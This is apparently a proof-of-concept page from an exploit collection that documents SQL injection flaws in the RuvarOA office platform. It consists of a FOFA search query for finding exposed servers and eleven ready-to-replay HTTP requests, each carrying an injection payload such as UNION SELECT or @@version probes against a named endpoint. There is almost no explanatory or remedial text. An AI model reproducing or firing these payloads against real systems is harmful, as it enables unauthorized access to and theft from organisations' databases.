## RuvarOA协同办公平台多处存在SQL注入漏洞

## fofa
```
body="txt_admin_key"
```

## 1、
```
GET /DepartmentPlan/department_plan_attach_download.aspx?sys_file_storage_id=%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCHAR%28113%29%2bCHAR%28106%29%2bCHAR%28118%29%2bCHAR%2898%29%2bCHAR%28113%29%2bCHAR%2873%29%2bCHAR%28107%29%2bCHAR%2866%29%2bCHAR%2881%29%2bCHAR%2871%29%2bCHAR%2889%29%2bCHAR%28114%29%2bCHAR%2888%29%2bCHAR%2871%29%2bCHAR%2876%29%2bCHAR%2866%29%2bCHAR%2890%29%2bCHAR%2886%29%2bCHAR%2874%29%2bCHAR%28109%29%2bCHAR%2898%29%2bCHAR%28106%29%2bCHAR%28107%29%2bCHAR%2885%29%2bCHAR%2871%29%2bCHAR%2877%29%2bCHAR%2899%29%2bCHAR%2885%29%2bCHAR%28103%29%2bCHAR%28118%29%2bCHAR%28101%29%2bCHAR%28120%29%2bCHAR%2874%29%2bCHAR%28117%29%2bCHAR%28109%29%2bCHAR%2865%29%2bCHAR%2882%29%2bCHAR%28105%29%2bCHAR%2876%29%2bCHAR%28102%29%2bCHAR%28120%29%2bCHAR%2887%29%2bCHAR%28101%29%2bCHAR%28105%29%2bCHAR%2884%29%2bCHAR%28113%29%2bCHAR%28118%29%2bCHAR%28113%29%2bCHAR%28118%29%2bCHAR%28113%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20- HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5807.225 Safari/537.36 Edg/112.0.1791.33
Connection: close
```
## 2、
```
GET /filemanage/file_memo.aspx?file_id=@@version HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5807.225 Safari/537.36 Edg/112.0.1791.33
Connection: close
```
## 3、
```
POST /ContractManage/get_company.aspx HTTP/1.1
Host: 
Upgrade-Insecure-Requests: 1
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 495

__EVENTTARGET=&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE=%2FwEPDwULLTE2NjkyODU1NDAPZBYCAgMPZBYGAgEPEGQPFgFmFgEQBQzpgInmi6nliIbnsbtlZxYBZmQCCQ88KwALAQAPFggeCERhdGFLZXlzFgAeC18hSXRlbUNvdW50Zh4JUGFnZUNvdW50AgEeFV8hRGF0YVNvdXJjZUl0ZW1Db3VudGZkZAILDw8WAh4RUGFnZXJfUmVjb3JkY291bnRmZGRkjBOPpsjzfyKuMGne7EKY2cnc17Zi99ZVNb4cfmiP0Z0%3D&ddl_type=&ddl_field=dw_bh&txt_keyword=1'+UNION+ALL+SELECT+@@version--+CwAf&btnSearch=%E6%9F%A5%E8%AF%A2&pager_input=1&pager_select=20&txt_row_index=&txt_dw_id=&txt_dw_mc=&txt_dw_bh=&txt_dw_lxr=&txt_dw_dh=
```
抓包重放
![image](https://github.com/wy876/POC/assets/139549762/a6d33c4b-629e-48e2-be52-3b35c118d3da)

![image](https://github.com/wy876/POC/assets/139549762/a9bb1311-b24c-4c59-8c18-292219787a42)


## 4、
```
GET /WorkFlow/wf_work_form_save.aspx?office_missive_id=@@version HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5807.225 Safari/537.36 Edg/112.0.1791.33
Connection: close
```
## 5、
```
GET /WorkFlow/wf_office_file_history_show.aspx?id=1%27%20and%20%28@@version%29%3E0-- HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5807.225 Safari/537.36 Edg/112.0.1791.33
Connection: close
```
## 6、
```
GET /WorkFlow/wf_get_fields_approve.aspx?template_id=@@version HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5807.225 Safari/537.36 Edg/112.0.1791.33
Connection: close
```
## 7、
```
GET /CorporateCulture/kaizen_download.aspx?file_id=1%27%29%20and%20%28select%20sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))%29%3E0-- HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5807.225 Safari/537.36 Edg/112.0.1791.33
Connection: close
```
## 8、
```
GET /include/get_dict.aspx?bi_value=1&bt_id=1%29+AND+1248+IN+%28SELECT+@@version%29+AND+%282558%3D2558&bt_name=1&bi_name=1 HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5807.225 Safari/537.36 Edg/112.0.1791.33
Connection: close
```
## 9、
```
GET /LHMail/email_attach_delete.aspx?attach_id=@@version HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5807.225 Safari/537.36 Edg/112.0.1791.33
Connection: close
```
## 10、
```
GET /WorkPlan/WorkPlanAttachDownLoad.aspx?sys_file_storage_id=1%27%20and%20%28@@version%29%3E0%29-- HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5807.225 Safari/537.36 Edg/112.0.1791.33
Connection: close
```

## 11、
```
GET /WorkFlow/OfficeFileDownload.aspx?filename=1%27%20and%20%28@@version%29%3E0-- HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5807.225 Safari/537.36 Edg/112.0.1791.33
Connection: close
```
